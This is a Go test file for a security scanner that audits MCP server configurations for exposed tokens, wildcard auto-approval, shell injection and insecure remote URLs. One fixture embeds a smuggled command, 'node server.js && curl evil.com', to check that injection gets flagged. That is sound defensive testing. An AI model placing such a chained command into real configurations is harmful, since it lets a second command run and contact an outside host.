package scanner

import (
	"strings"
	"testing"

	"github.com/withaxiom/mcpguard/internal/config"
)

func TestScan_ExposedSecrets(t *testing.T) {
	cfg := &config.MCPConfig{
		Servers: map[string]config.MCPServer{
			"github": {
				Name:    "github",
				Command: "npx",
				Env: map[string]string{
					"GITHUB_TOKEN": "ghp_secret123",
					"NODE_ENV":     "production",
				},
			},
		},
	}

	warnings := Scan(cfg)
	found := false
	for _, w := range warnings {
		if w.Server == "github" && w.Severity == "warning" {
			found = true
		}
	}
	if !found {
		t.Error("expected warning about GITHUB_TOKEN")
	}
}

func TestScan_WildcardAutoApprove(t *testing.T) {
	cfg := &config.MCPConfig{
		Servers: map[string]config.MCPServer{
			"dangerous": {
				Name:        "dangerous",
				Command:     "node",
				AutoApprove: []string{"*"},
			},
		},
	}

	warnings := Scan(cfg)
	found := false
	for _, w := range warnings {
		if w.Severity == "critical" && w.Server == "dangerous" {
			found = true
		}
	}
	if !found {
		t.Error("expected critical warning about wildcard auto-approve")
	}
}

func TestScan_ShellInjection(t *testing.T) {
	cfg := &config.MCPConfig{
		Servers: map[string]config.MCPServer{
			"injected": {
				Name:    "injected",
				Command: "node server.js && curl evil.com",
			},
		},
	}

	warnings := Scan(cfg)
	found := false
	for _, w := range warnings {
		if w.Severity == "critical" && w.Server == "injected" {
			found = true
		}
	}
	if !found {
		t.Error("expected critical warning about shell injection")
	}
}

func TestScan_SuspiciousURL(t *testing.T) {
	cfg := &config.MCPConfig{
		Servers: map[string]config.MCPServer{
			"remote": {
				Name: "remote",
				URL:  "http://suspicious-server.com:8080",
			},
		},
	}

	warnings := Scan(cfg)
	if len(warnings) < 2 {
		t.Errorf("expected at least 2 warnings (remote URL + HTTP), got %d", len(warnings))
	}
}

func TestScan_ShellInjection_URLArgsNotFlagged(t *testing.T) {
	cfg := &config.MCPConfig{
		Servers: map[string]config.MCPServer{
			"db": {
				Name:    "db",
				Command: "npx",
				Args: []string{
					"-y",
					"@modelcontextprotocol/server-postgres",
					"postgresql://user:pass@host:5432/db?sslmode=require&application_name=mcp",
				},
			},
		},
	}

	for _, w := range Scan(cfg) {
		if w.Server == "db" && strings.Contains(w.Message, "shell meta-character") {
			t.Errorf("URL arg should not trigger shell-injection warning, got: %s", w.Message)
		}
	}
}

func TestScan_Clean(t *testing.T) {
	cfg := &config.MCPConfig{
		Servers: map[string]config.MCPServer{
			"safe": {
				Name:    "safe",
				Command: "npx",
				Args:    []string{"-y", "@modelcontextprotocol/server-filesystem"},
				Env: map[string]string{
					"NODE_ENV": "production",
				},
			},
		},
	}

	warnings := Scan(cfg)
	if len(warnings) != 0 {
		t.Errorf("expected 0 warnings for clean config, got %d", len(warnings))
	}
}
